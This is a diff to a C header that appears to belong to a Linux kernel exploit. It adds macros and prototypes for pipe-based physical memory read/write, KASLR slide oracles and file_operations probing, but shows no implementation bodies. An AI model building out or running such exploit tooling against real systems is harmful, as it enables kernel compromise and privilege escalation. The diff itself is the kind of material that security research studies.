@@ -41,8 +41,12 @@
 
 #define KERNEL_PAGE_SETUP_ATTEMPTS 6
 #if defined(APP_PAYLOAD) && APP_PAYLOAD
+#ifndef SLIDE_KERNEL_PAGE_SETUP_ATTEMPTS
 #define SLIDE_KERNEL_PAGE_SETUP_ATTEMPTS 2
+#endif
+#ifndef FOPS_KERNEL_PAGE_SETUP_ATTEMPTS
 #define FOPS_KERNEL_PAGE_SETUP_ATTEMPTS 2
+#endif
 #else
 #define SLIDE_KERNEL_PAGE_SETUP_ATTEMPTS 12
 #define FOPS_KERNEL_PAGE_SETUP_ATTEMPTS 72
@@ -63,6 +67,12 @@
 #endif
 #ifndef MM_STRUCT_SLAB_SZ
 #define MM_STRUCT_SLAB_SZ MM_STRUCT_SZ
+#endif
+#ifndef KERNELSNITCH_VERBOSE
+#define KERNELSNITCH_VERBOSE 0
+#endif
+#ifndef KERNELSNITCH_MTE_ENABLED
+#define KERNELSNITCH_MTE_ENABLED 0
 #endif
 #define MM_PARTIALS 5
 #define CORE 0
@@ -295,6 +305,9 @@ extern uint32_t pipe_probe_len;
 extern uint32_t pipe_probe_flags;
 extern uint64_t pipe_scan_first_page;
 extern uint64_t pipe_scan_first_ops;
+#if defined(APP_PHYS_VIRTUAL_BASE_ORACLE) && APP_PHYS_VIRTUAL_BASE_ORACLE
+extern int p0_virtual_base_probe;
+#endif
 extern uint64_t pipe_scan_q0;
 extern uint64_t pipe_scan_q1;
 extern uint64_t pipe_scan_q2;
@@ -319,6 +332,10 @@ extern uintptr_t slide_oracle_target;
 extern uintptr_t slide_oracle_child;
 extern uintptr_t p0_gate_page_struct;
 extern uintptr_t p0_probe_page_struct;
+extern uintptr_t fops_data_probe_addr;
+extern int fops_data_probe_active;
+extern int data_alias_uses_slide;
+extern int slide_p0_session_fresh;
 extern int memfd_leak;
 
 int run_exploit(int argc, char **argv);
@@ -381,6 +398,11 @@ int select_slide_payload_slot(uintptr_t offset);
 int select_slide_payload_index(size_t index);
 #if defined(APP_PHYS_P0_ORACLE) && APP_PHYS_P0_ORACLE
 int app_trigger_fops_slide_route(void);
+#if (defined(APP_FOPS_ORACLE_DIAG_ONLY) && APP_FOPS_ORACLE_DIAG_ONLY) || \
+    (defined(APP_FOPS_DATA_ALIAS_DIAG_ONLY) && \
+     APP_FOPS_DATA_ALIAS_DIAG_ONLY)
+int app_trigger_fops_oracle_slot(size_t slot);
+#endif
 #endif
 #endif
 
@@ -434,7 +456,11 @@ int install_pipe_physrw(int fd);
 int prepare_p0_pipe_oracle(void);
 int expand_p0_pipe_oracle(void);
 int verify_p0_pipe_oracle_gate(void);
+int verify_p0_pipe_data_page(uintptr_t target, uint64_t expected);
 uintptr_t scan_p0_pipe_oracle(void);
+#if defined(APP_PHYS_VIRTUAL_BASE_ORACLE) && APP_PHYS_VIRTUAL_BASE_ORACLE
+uint64_t scan_p0_virtual_base_pointer(void);
+#endif
 int restore_p0_oracle_pages(int fd);
 int run_p0_pipe_oracle_diagnostic(int fd);
 #endif
